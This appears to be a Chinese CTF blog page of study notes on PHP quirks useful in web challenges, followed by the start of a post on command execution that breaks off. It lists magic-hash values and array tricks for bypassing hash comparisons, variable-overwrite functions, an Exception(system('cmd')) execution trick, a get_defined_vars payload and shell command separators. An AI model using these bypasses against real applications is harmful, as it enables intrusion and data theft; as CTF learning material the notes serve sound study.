<p>优先级：</p>
<p>&amp;&amp;与||的优先级高于= ，=的优先级高于and与or</p>
<p>反射类的具体使用方法可参考php官网文档,简单来说反射类就是存放了类里的所有东西。<br>最简单的方法直接输出这个类即可，也就是构造出 echo new ReflectionClass(‘ctfshow’);</p>
<h2 id="0x07call-user-func"><a href="#0x07call-user-func" class="headerlink" title="0x07call_user_func"></a>0x07call_user_func</h2><p><strong>回调函数</strong></p>
<p><img src="/2022/02/28/PHP%E7%89%B9%E6%80%A7/image-20220303154034609.png" alt="image-20220303154034609"></p>
<h2 id="0x08-sha1"><a href="#0x08-sha1" class="headerlink" title="0x08 sha1()"></a>0x08 sha1()</h2><p><strong>PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。</strong></p>
<p>常见的payload有</p>
<pre><code>    QNKCDZO
    240610708
    s878926199a
    s155964671a
    s214587387a
    s214587387a
     sha1(str)
    sha1(&#39;aaroZmOk&#39;)  
    sha1(&#39;aaK1STfY&#39;)
    sha1(&#39;aaO8zKZF&#39;)
    sha1(&#39;aa3OFF9m&#39;)
</code></pre>
<p>同时MD5不能处理数组，若有以下判断则可用数组绕过</p>
<p>sha1加密数组的时候会无法处理导致<code>sha1($_GET[&#39;uname&#39;])</code>和<code>sha1($_POST[&#39;passwd&#39;])</code>的返回值都为null这就绕过了强相等</p>
<h2 id="0x09-变量覆盖"><a href="#0x09-变量覆盖" class="headerlink" title="0x09 变量覆盖"></a>0x09 变量覆盖</h2><p>die($error)</p>
<p>die($error);漏洞 输出相当于echo一样</p>
<p>例如下面的函数或者语法使用不当时就会出现漏洞。</p>
<ul>
<li><p><code>$$</code></p>
</li>
<li><p><code>extract()</code>    从数组中将变量导入到当前的符号表。</p>
</li>
<li><p><code>parse_str()</code>  把查询字符串解析到变量中</p>
</li>
<li><p><code>mb_parse_str</code> 解析 GET/POST/COOKIE 数据并设置全局变量</p>
</li>
<li><p><code>import_request_variables()</code> 将 GET／POST／Cookie 变量导入到全局作用域中,只要利用了这个函数，就可以直接对里面的变量进行赋值。</p>
</li>
<li><p><img src="/2022/02/28/PHP%E7%89%B9%E6%80%A7/image-20220303211428579.png" alt="image-20220303211428579"></p>
</li>
<li><p><code>register_globals</code> 注册为全局变量</p>
</li>
</ul>
<p>$</p>
<p>原理</p>
<p>$$产生的漏洞主要是因为foreach遍历数组的值，然后将获取的数组键名作为变量，数组中的值作为变量的值。</p>
<p>在这先简单介绍一下foreach和$$。</p>
<p>foreach循环只适用于数组，并用于遍历数组中的每个键/值对。</p>
<pre><code>&lt;?php 
$colors = array(&quot;red&quot;,&quot;green&quot;,&quot;blue&quot;,&quot;yellow&quot;); 
 
foreach ($colors as $value) &#123;
   echo &quot;$value \n&quot;;
&#125;
?&gt;
输出：red
 green
 blue
 yellow 
</code></pre>
<p>$$这里举个栗子</p>
<p>在PHP中，$var表示一个名为var的普通变量，它存储字符串、整数、浮点等任何值。而$$var是一个引用变量，用于存储$var的值。</p>
<p>在我看来就是套娃。</p>
<pre><code>&lt;?php
$var = &quot;ee&quot;;
$$var = &quot;eeknight&quot;;
echo $var ;
echo &quot;\n&quot;;
echo $$var;
echo &quot;\n&quot;;
echo &quot;$ee&quot;;
?&gt;
输出：ee
     eeknight
  eeknight
</code></pre>
<p>为什么echo “$a = $a; $b = $b; $c = $c”;这里要加上\呢</p>
<p>解：这些斜杠的的意思就是，让后面的变量失去意义。那么写的是什么就是什么。</p>
<p>parse_str()</p>
<p>php.ini文件中的magic_quotes_gpc设置影响该函数的输出。如果已启用，那么在parse_str()解析之前，变量会被 addslashes() 转换。</p>
<p>import_request_variables()</p>
<p>该函数在最新版本的 PHP 中已经不支持。</p>
<p>支持的版本：PHP 4 &gt;= 4.1.0, PHP 5 &lt; 5.4.0。</p>
<p>register_globals</p>
<p>register_globals从php5.3.0起废弃，并从php5.4.0时移除。</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_38154820/article/details/115154181">https://blog.csdn.net/qq_38154820/article/details/115154181</a></p>
<h2 id="0x10-parse-str"><a href="#0x10-parse-str" class="headerlink" title="0x10 parse_str()"></a>0x10 parse_str()</h2><p><img src="/2022/02/28/PHP%E7%89%B9%E6%80%A7/image-20220303222053020.png" alt="image-20220303222053020"></p>
<p><img src="/2022/02/28/PHP%E7%89%B9%E6%80%A7/image-20220303222601095.png" alt="image-20220303222601095"></p>
<h2 id="0x11ereg"><a href="#0x11ereg" class="headerlink" title="0x11ereg()"></a>0x11ereg()</h2><p><img src="/2022/02/28/PHP%E7%89%B9%E6%80%A7/image-20220303223932257.png" alt="image-20220303223932257"></p>
<p>strrev() 字符串反转<br> intval() 获取变量的整数值<br> %00是字符串的结束标识符，可以截断，%00正则截断，正则表达式只会匹配%00之前的内容，后面的被截断掉，可以通过正则表达式检测</p>
<h2 id="0x12-异常处理类"><a href="#0x12-异常处理类" class="headerlink" title="0x12 异常处理类"></a>0x12 异常处理类</h2><p>PHP 中提供了内置的异常处理类——Exception，该类中常用的成员函数如下所示：</p>
<ul>
<li>getMessage()：返回异常的消息内容；</li>
<li>getCode()：以数字形式返回异常代码；</li>
<li>getFile()：返回发生异常的文件名；</li>
<li>getLine()：返回发生错误的代码行号；</li>
<li>getTrace()：返回 backtrace() 数组；</li>
<li>getTraceAsString()：返回已格式化成字符串的、由函数 getTrace() 函数所产生的信息；</li>
<li>__toString()：产生异常的字符串信息，它可以重载。注意，该函数最前部是两个下划线。</li>
</ul>
<p>下面代码是 Exception 类的完整代码，从这个类的定义可以看出哪些属性和方法（成员函数）在用户派生的子类中是可以访问和继承的。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Exception</span> &#123;</span><br><span class="line">    <span class="comment">/* 属性 */</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">string</span> <span class="variable">$message</span> ;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">int</span> <span class="variable">$code</span> ;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">string</span> <span class="variable">$file</span> ;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">int</span> <span class="variable">$line</span> ;</span><br><span class="line">    <span class="comment">/* 方法 */</span></span><br><span class="line">    <span class="keyword">public</span> __construct ([ <span class="keyword">string</span> <span class="variable">$message</span> = <span class="string">&quot;&quot;</span> [, <span class="keyword">int</span> <span class="variable">$code</span> = <span class="number">0</span> [, <span class="built_in">Throwable</span> <span class="variable">$previous</span> = <span class="literal">NULL</span> ]]] )</span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">public</span> getMessage ( <span class="keyword">void</span> ) : <span class="keyword">string</span></span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">public</span> getPrevious ( <span class="keyword">void</span> ) : <span class="built_in">Throwable</span></span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">public</span> getCode ( <span class="keyword">void</span> ) : <span class="keyword">int</span></span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">public</span> getFile ( <span class="keyword">void</span> ) : <span class="keyword">string</span></span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">public</span> getLine ( <span class="keyword">void</span> ) : <span class="keyword">int</span></span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">public</span> getTrace ( <span class="keyword">void</span> ) : <span class="keyword">array</span></span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">public</span> getTraceAsString ( <span class="keyword">void</span> ) : <span class="keyword">string</span></span><br><span class="line">    <span class="keyword">public</span> __toString ( <span class="keyword">void</span> ) : <span class="keyword">string</span></span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">private</span> __clone ( <span class="keyword">void</span> ) : <span class="keyword">void</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在 PHP 中想要捕获程序中的异常，需要使用 try catch 语句和 throw 关键字来实现。try catch 语句和流程控制语句类似，所以可以通过 try catch 语句来实现一种另类的条件选择结构，而 throw 关键字则可以抛出一个异常。try catch 语句的语法格式如下：</p>
<p>try{<br>  // 可能出现异常或错误的代码，比如文件操作、数据库操作等<br>}catch(Exception $e){  // $e 为一个异常类的对象<br>  // 输出错误信息<br>}</p>
<p>需要进行异常处理的代码都必须放入 try 代码块内，以便捕获可能存在的异常。每一个 try 至少要有一个与之对应的 catch。使用多个 catch 可以捕获不同的类所产生的异常。</p>
<p>当 try 代码块不再抛出异常或者找不到 catch 能匹配所抛出的异常时，PHP 代码就会在跳转到最后一个 catch 的后面继续执行。</p>
<p>在 PHP 代码中所产生的异常可以被 throw 语句抛出并被 catch 语句捕获。当然，PHP 允许在 catch 代码块内再次抛出（throw）异常。</p>
<p>当一个异常被抛出时，其后的代码不会再继续执行，而 PHP 就会尝试继续查找第一个能与之匹配的 catch。如果一个异常没有被捕获，而且又没用使用 set_exception_handler() 作相应的处理的话，将会产生一个严重的错误，并且输出 UncaughtException…（未捕获异常）的提示信息。</p>
<p>【示例】使用 try catch 和 throw 捕获程序中的异常。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    <span class="keyword">try</span>&#123;        <span class="variable">$err</span> = <span class="string">&#x27;抛出异常信息，并跳出 try 语句块&#x27;</span>;        <span class="keyword">if</span>(is_dir(<span class="string">&#x27;./test&#x27;</span>))&#123;            <span class="keyword">echo</span> <span class="string">&#x27;这里是一些可能会发生异常的代码&#x27;</span>;        &#125;<span class="keyword">else</span>&#123;            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="variable">$err</span>, <span class="number">12345</span>);   <span class="comment">// 抛出异常        &#125;        echo &#x27;上面抛出异常的话，这行代码将不会执行，转而执行 catch 中的代码。&lt;br&gt;&#x27;;    &#125;catch(Exception $e)&#123;        echo &#x27;捕获异常：&#x27;.$e-&gt;getMessage().&#x27;&lt;br&gt;错误代码：&#x27;.$e-&gt;getCode().&#x27;&lt;br&gt;&#x27;;    &#125;    echo &#x27;继续执行 try catch 语句之外的代码&#x27;;<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>运行结果如下：</p>
<p>捕获异常：抛出异常信息，并跳出 try 语句块<br>错误代码：12345<br>继续执行 try catch 语句之外的代码</p>
<p>示例代码中，在 try 语句块中试着判断当前目录下是否存在名为 test 的目录，如果不存在这个目录，那么就会执行第 7 行的代码，通过关键字 throw 抛出异常。这个异常是一个 Exception 类的对象，通过 new 关键字生成，并且用错误信息 $err 和错误代码 12345 初始化该对象，以便后面 catch 该异常时（代码第 11 行），可以获取这些信息。</p>
<p>一旦抛出异常，那么 try 语句块中剩下的代码就不再继续执行，程序流程转至相应的 catch 语句块执行，最终通过 Exception 对象调用其成员函数输出错误信息和代码。</p>
<p><strong>PHP 创建自己的异常类</strong></p>
<p>在各种语言里，对异常和错误的定义不同。在 PHP 里遇到任何错误都会抛出一个错误，很少会主动抛出异常，不像 Java 语言那样会预先定义好各种异常类，当程序执行到异常处的代码时会主动抛出。</p>
<p>PHP 的异常处理机制并不完善，在 PHP 中想处理不可预料的异常是办不到的，必须事先定义一些异常，将各种可能出现的异常进行 if…else 判断，手动抛出异常，所以在 PHP 里经常会使用到我们自己创建的异常类。</p>
<p>下面定义两个异常类，都继承自 Exception 基类。</p>
<figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">emailException</span> <span class="keyword">extends</span> <span class="title">Exception</span></span>&#123;    function __toString()&#123;        <span class="keyword">return</span> <span class="string">&quot;&lt;b&gt;email is null&lt;/b&gt;file:&quot;</span>.$<span class="keyword">this</span>-&gt;getFile().&#x27;,line:&#x27;. $<span class="keyword">this</span>-&gt;getLine();    &#125;&#125;<span class="class"><span class="keyword">class</span> <span class="title">nameException</span> <span class="keyword">extends</span> <span class="title">Exception</span></span>&#123;&#125;</span><br></pre></td></tr></table></figure>

<p>在实际业务中可根据不同需求抛出不同异常，业务代码如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">reg</span>(<span class="params"><span class="variable">$reg</span></span>) </span>&#123;    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$reg</span>[<span class="string">&#x27;email&#x27;</span>])) &#123;        <span class="keyword">throw</span> <span class="keyword">new</span> emailException(<span class="string">&quot;emaill is null&quot;</span>, <span class="number">1</span>);    &#125;    <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$reg</span>[<span class="string">&#x27;name&#x27;</span>])) &#123;        <span class="keyword">throw</span> <span class="keyword">new</span> nameException(<span class="string">&quot;name is null&quot;</span>, <span class="number">2</span>);     &#125;&#125;</span><br></pre></td></tr></table></figure>

<p>在执行业务代码时，需要使用 if 语句判断异常会发生的地方，然后手动抛出异常，将不同的异常分发给不同的异常类处理，如下所示：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>&#123;    <span class="variable">$reg</span> = <span class="keyword">array</span>(<span class="string">&#x27;phone&#x27;</span>=&gt;<span class="string">&#x27;1888888888&#x27;</span>);    reg(<span class="variable">$reg</span>);&#125; <span class="keyword">catch</span>(emailException <span class="variable">$e</span>) &#123;    <span class="keyword">echo</span> <span class="variable">$e</span>;&#125; <span class="keyword">catch</span>(nameException <span class="variable">$e</span>) &#123;    <span class="keyword">echo</span> <span class="string">&#x27;error msg:&#x27;</span> .<span class="variable">$e</span>-&gt;getMessage().<span class="string">&#x27;error code:&#x27;</span>.<span class="variable">$e</span>-&gt;getCode();&#125; <span class="keyword">finally</span> &#123;    <span class="keyword">echo</span> <span class="string">&#x27; finally&#x27;</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>这段程序根据不同的情况捕获不同的异常，如果第一个 catch 捕获了异常，即使程序中仍然存在其他异常，也会跳过其他的 catch 代码块，但是不管程序中是否出现异常，最终 finally 中的语句都会执行。</p>
<p>执行以上程序的结果为：  </p>
<p><strong>email is null</strong> file:/Library/WebServer/Documents/book/try.php,line:39 finally</p>
<h3 id="ReflectionClass-打印类结果"><a href="#ReflectionClass-打印类结果" class="headerlink" title="ReflectionClass 打印类结果"></a>ReflectionClass 打印类结果</h3><p>Exception<br> 通过异常处理类Exception(system(‘cmd’))可以运行指定代码，并且能返回运行的结果（如果存在返回），Exception括号里不加分号！！</p>
<p>echo new Exception();</p>
<p>echo new ReflectionClass();</p>
<h2 id="0x13-FilesystemIterator类"><a href="#0x13-FilesystemIterator类" class="headerlink" title="0x13 FilesystemIterator类"></a>0x13 FilesystemIterator类</h2><p>php内置类 利用 FilesystemIterator 获取指定目录下的所有文件</p>
<p>getcwd()函数 获取当前工作目录 返回当前工作目录</p>
<p>FilesystemIterator就是一个读取目录下文件名的，如果参数能给一个/就能读取当前目录所有文件，这里符号都不能用了，这里php中的getcwd()可以帮我们替代/,获取路径后直接访问得到flag</p>
<h2 id="0x14-trim函数绕过-is-numeric绕过"><a href="#0x14-trim函数绕过-is-numeric绕过" class="headerlink" title="0x14 trim函数绕过+is_numeric绕过"></a>0x14 trim函数绕过+is_numeric绕过</h2><p>trim函数介绍：移除字符串两侧的空白字符或其他预定义字符。</p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">语法</span><br><span class="line">trim(<span class="type">string</span>,charlist)</span><br><span class="line"></span><br><span class="line">参数	描述</span><br><span class="line"><span class="type">string</span>	        必需。规定要检查的字符串。</span><br><span class="line">charlist	    可选。规定从字符串中删除哪些字符。如果省略该参数，则移除下列所有字符：</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\0&quot;</span>       - NULL</span><br><span class="line"><span class="string">&quot;<span class="subst">\t</span>&quot;</span>       - 制表符</span><br><span class="line"><span class="string">&quot;<span class="subst">\n</span>&quot;</span>       - 换行</span><br><span class="line"><span class="string">&quot;\x0B&quot;</span>     - 垂直制表符</span><br><span class="line"><span class="string">&quot;\r&quot;</span>       - 回车</span><br><span class="line"><span class="string">&quot; &quot;</span>        - 空格</span><br></pre></td></tr></table></figure>

<p>通过羽师傅脚本跑出%0c(换页符可用),可绕过弱类型比较和trim()</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt;=<span class="number">128</span> ; <span class="variable">$i</span>++) &#123; </span><br><span class="line">    <span class="variable">$x</span>=chr(<span class="variable">$i</span>).<span class="string">&#x27;36&#x27;</span>;</span><br><span class="line">   <span class="keyword">if</span>(trim(<span class="variable">$x</span>)!==<span class="string">&#x27;36&#x27;</span> &amp;&amp;  is_numeric(<span class="variable">$x</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> urlencode(chr(<span class="variable">$i</span>)).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//%0C (换页符)</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/2022/02/28/PHP%E7%89%B9%E6%80%A7/image-20220304174929829.png" alt="image-20220304174929829"></p>
<h2 id="0x15-SERVER-‘argv’"><a href="#0x15-SERVER-‘argv’" class="headerlink" title="0x15 $_SERVER[‘argv’]"></a>0x15 $_SERVER[‘argv’]</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、cli模式（命令行）下</span><br><span class="line">	第一个参数$_SERVER<span class="selector-attr">[<span class="string">&#x27;argv&#x27;</span>]</span><span class="selector-attr">[0]</span>是脚本名，其余的是传递给脚本的参数</span><br><span class="line"><span class="number">2</span>、web网页模式下</span><br><span class="line">在web页模式下必须在php.ini开启register_argc_argv配置项</span><br><span class="line">设置register_argc_argv = On(默认是Off)，重启服务，$_SERVER<span class="selector-attr">[‘argv’]</span>才会有效果</span><br><span class="line">这时候的$_SERVER<span class="selector-attr">[‘argv’]</span><span class="selector-attr">[0]</span> = $_SERVER<span class="selector-attr">[‘QUERY_STRING’]</span></span><br><span class="line"><span class="variable">$argv</span>,<span class="variable">$argc</span>在web模式下不适用</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>$a[0]即$_SERVER[‘argv’][0]= $_SERVER<a href="%E8%8E%B7%E5%8F%96url%E4%B8%AD?%E5%90%8E%E7%9A%84%E9%83%A8%E5%88%86">‘QUERY_STRING’</a>，这时我们要做的是通过eval(“$c”.”;”);为$flag赋值flag_give_me，即：<br>eval(eval($flag=flag_give_me).; ),将flag赋值后即可通过if判断输出flag<br>$_SERVER</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&quot;QUERY_STRING&quot;</span>]  获取查询 语句，实例中可知，获取的是?后面的值</span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&quot;REQUEST_URI&quot;</span>]   获取 http:<span class="regexp">//</span>localhost 后面的值，包括/</span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&quot;SCRIPT_NAME&quot;</span>]   获取当前脚本的路径，如：index.php</span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&quot;PHP_SELF&quot;</span>]      当前正在执行脚本的文件名</span><br><span class="line">http:<span class="regexp">//</span>localhost<span class="regexp">/aaa/i</span>ndex.php?p=<span class="number">222</span>&amp;q=<span class="number">333</span></span><br><span class="line">结果：</span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>] = <span class="string">&quot;p=222&amp;q=333&quot;</span>;</span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>]  = <span class="string">&quot;/aaa/index.php?p=222&amp;q=333&quot;</span>;</span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;SCRIPT_NAME&#x27;</span>]  = <span class="string">&quot;/aaa/index.php&quot;</span>;</span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>]     = <span class="string">&quot;/aaa/index.php&quot;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>eval()</strong></p>
<p><code>eval()</code> 是一个语句，将字符串当做PHP 代码来执行。</p>
<p><strong>assert()</strong></p>
<p><code>assert</code> 是一个函数，将字符串当做PHP 代码来执行。</p>
<h2 id="0x16-gettext扩展"><a href="#0x16-gettext扩展" class="headerlink" title="0x16 gettext扩展"></a>0x16 <strong>gettext扩展</strong></h2><p>小知识点： _()是一个函数</p>
<p>_()==gettext() 是gettext()的拓展函数，开启text扩展。需要php扩展目录下有php_gettext.dll</p>
<p><strong>gettext扩展</strong></p>
<p>gettext函数会使用提供的字符串作为键值去查找当前设置语言对应的翻译版本，如果没有找到则返回原始的字符串gettext(“phpinfo”)等同于phpinfo()<br> 在开启该拓展后”_ “等效于 gettext()<br>所以call_user_func(’_’,‘phpinfo’) 返回的就是phpinfo</p>
<p>get_defined_vars()函数</p>
<p>get_defined_vars — 返回由所有已定义变量所组成的数组，这些变量包括环境变量、服务器变量和用户定义的变量。 这样可以获得 $flag</p>
<p>payload: ?f1=_&amp;f2=get_defined_vars</p>
<p>即：<br>var_dump(call_user_func(call_user_func($f1,$f2)));<br>var_dump(call_user_func(call_user_func(_,’get_defined_vars’)));<br>var_dump(call_user_func(get_defined_vars));</p>
<h2 id="0x17-stripos"><a href="#0x17-stripos" class="headerlink" title="0x17 stripos()"></a>0x17 stripos()</h2><p>stripos() 函数查找字符串在另一字符串中第一次出现的位置（不区分大小写） </p>
<h2 id="0x18正则溢出，回溯次数绕过"><a href="#0x18正则溢出，回溯次数绕过" class="headerlink" title="0x18正则溢出，回溯次数绕过"></a>0x18正则溢出，回溯次数绕过</h2><p>在PHP的pcre扩展中, 提供了俩个设置项.</p>
<p>1 pcre.backtrack_limit //最大回溯数<br>2 pcre.recursion_limit //最大嵌套数</p>
<p>默认的backtarck_limit是100000(10万).<br>现在要弄清这个问题的原因, 关键就是什么是”回溯”.<br>这个正则, 使用非贪婪模式, 非贪婪模式匹配原理简单来说是, 在可配也可不配的情况下, 优先不匹配. 记录备选状态, 并将匹配控制交给正则表达式的下一个匹配字符, 当之后的匹配失败的时候, 再溯, 进行匹配.</p>
<p>举个例子:<br>源字符串: aaab正则: .<em>?<br>匹配过程开始的时候, “.</em>?”首先取得匹配控制权, 因为是非贪婪模式, 所以优先不匹配, 将匹配控制交给下一个匹配字符”b”, “b”在源字符串位置1匹配失败(“a”), 于是回溯, 将匹配控制交回给”.<em>?”, 这个时候, “.</em>?”匹配一个字符”a”, 并再次将控制权交给”b”, 如此反复, 最终得到匹配结果, 这个过程中一共发生了3次回溯.</p>
<p>最后，还是要说一下</p>
<p>1、在PHP 5.2以后, 提供了:int preg_last_error ( void )Returns the error code of the last PCRE regex execution.<br>我们应该经常检查这个函数的返回值, 当不为零的时候说明上一个正则函数出错, 特别的对于文章的例子, 出错返回(PREG_BACKTRACK_LIMIT_ERROR)<br>2、非贪婪模式导致太多回溯, 必然会有一些性能问题, 适当的该写下正则, 是可以避免这个问题的. 尤其在做大数据量的文本处理的时候, 如果正则设计不慎, 很容易导致深度嵌套, 另外考虑到性能, 还是建议能用字符串处理尽量使用字符串处理代替.</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/02/26/CTF%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%80%BB%E7%BB%93/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CJ">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Echo">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022/02/26/CTF%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%80%BB%E7%BB%93/" class="post-title-link" itemprop="url">CTF命令执行总结</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>
      

      <time title="Created: 2022-02-26 22:57:00 / Modified: 23:47:47" itemprop="dateCreated datePublished" datetime="2022-02-26T22:57:00+08:00">2022-02-26</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">In</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
        </span>
    </span>

  
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="Symbols count in article">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">Symbols count in article: </span>
      <span>11k</span>
    </span>
    <span class="post-meta-item" title="Reading time">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">Reading time &asymp;</span>
      <span>10 mins.</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h2 id="0x01-基础命令符号类"><a href="#0x01-基础命令符号类" class="headerlink" title="0x01 基础命令符号类"></a>0x01 基础命令符号类</h2><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#①转义字符</span></span><br><span class="line">windows中^</span><br><span class="line">linux中\</span><br><span class="line"><span class="comment">#②多条命令执行连接的符号</span></span><br><span class="line">windows中&amp;&amp; || %0a;</span><br><span class="line">linux下 &amp;&amp; || ; $() <span class="string">``</span> %0a  %0d</span><br><span class="line"><span class="comment">#③注释字符</span></span><br><span class="line">windows下::</span><br><span class="line">linux下<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<h2 id="0x02-常见的命令类"><a href="#0x02-常见的命令类" class="headerlink" title="0x02 常见的命令类"></a>0x02 常见的命令类</h2><p>读取文件的命令</p>
<figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#读取文件</span></span><br><span class="line">highlight_file(<span class="string">&quot;index.php&quot;</span>);</span><br><span class="line">show_source()  file_get_contents</span><br><span class="line"><span class="meta">#glob() 函数返回匹配指定模式的文件名或目录。</span></span><br><span class="line"><span class="meta">#举个例子:</span></span><br><span class="line">glob(<span class="string">&quot;*&quot;</span>) 匹配任意文件</span><br><span class="line">glob(<span class="string">&quot;*.txt&quot;</span>)匹配以txt为后缀的文件</span><br><span class="line"><span class="meta">#打印文件的命令</span></span><br><span class="line">print_r();</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>找文件命令,如找flag.txt文件方法</p>
